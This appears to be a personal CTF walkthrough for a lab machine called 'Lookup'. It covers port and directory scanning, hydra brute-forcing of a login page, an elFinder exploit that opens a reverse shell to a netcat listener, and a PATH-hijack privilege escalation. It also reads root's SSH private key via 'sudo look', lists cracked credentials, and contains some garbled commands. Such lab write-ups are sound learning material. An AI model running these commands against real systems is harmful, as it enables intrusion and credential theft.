1- Adding the ip to the hosts
  commands: * sudo su
	    * nano /etc/hosts
 add 
   ip    lookup.thm

2- Scan the ports
 command: namp -Pn ip

3- Looking for the hidden files by gobuster or dirsearch
 command: dirsearch -u http://lookup.thm
 or
 command:gobuster dir -u http://ip/ -w /usr/share/wordlists/dirb/common.txt

4- Try to login in the login page (index.php) --> The user "admin" is found but with wrong password

5- Make a Brute force attack by hydra to get the password of admin
  command: hydra -L admin -p rockyou.txt lookup.thm \
		http-post-form "/index.php:username=admin&password=^PASS^:"Wrong password. Please try again."
  or 
    By using Burb suite Intruder or ZAP

But this need permision to explore his password so no result found

6- Try to enter as a ordinary user
  command: hydrd -L <usersnameList.txt> -p <any_password>
   http-post-form "login.php:username=^USER^&password=<any_password->as:admin >:"The Massage that appeare in the website if you don't have username or password"
   *The massage in the end of the command is the condition,if not that this command shold give me Invalid username

7- Try to get the password of any user of the found
 command: hydra -l <username> -P <password.txt>
  http-post-form "login.php:usernmae=<username>&password=^PASS^:"The Massage found on the website(condition)" 

8- Login by the user cardinential
 the page don't found because its name is changed so we change the name of the web in our hosts file to the name of the url in the website

9- After we enterd to the page we try to upload reveseshell file but the website can know the php commands and refuse to upload eny file.php or commands

10- Try to use something else we search on (elFinder and how to exploit it)
  download python file and use it commands
 run the file and see options:
   command:
	*python3 exploit.py -h                                                                                  
	    options:
 		-h, --help            show this help message and exit
  		-t <Target base URL>  Example: -t http://elfinder.url/elfinder/
 		-lh <Listener IP>     Example: -lh 127.0.0.1
  		-lp <Listener Port>   Example: -lp 1337
                                                                                                                    
 run the listener command:
	 *python3 exploit.py -t 'http://files.lookup.thm/elFinder' -lh 192.168.128.184 -lp 1337 
   #Don't forget to run the lestenner in another terminal--> command: nc -lvnp <port>

11- After the lestenner run we can enter the user machine and we can looking for the user.txt file as
 command: find / -name "user.txt" 2>/dev/null



jose : password123



to add think to the path
echo "echo 'uid=33(think) gid=33(think) groups=33(think)'" > /tmp/id


think : josemario.AKA(think)

To arrive to the rsa key in the hacking machine I can use this commands
  *LFILE=/root/.ssh/id_rsa
  *sudo /usr/bin/look '' "$LFILE"
I got these commands form gtfobins.com website

After that I can do a new file and but this key in it

Give permisions to this file : chmod 600 id_ars 

Enter the root machine by this command: ssh -i id_rsa root@lookup.thm

Finall find the flag by: cat /root/root.txt
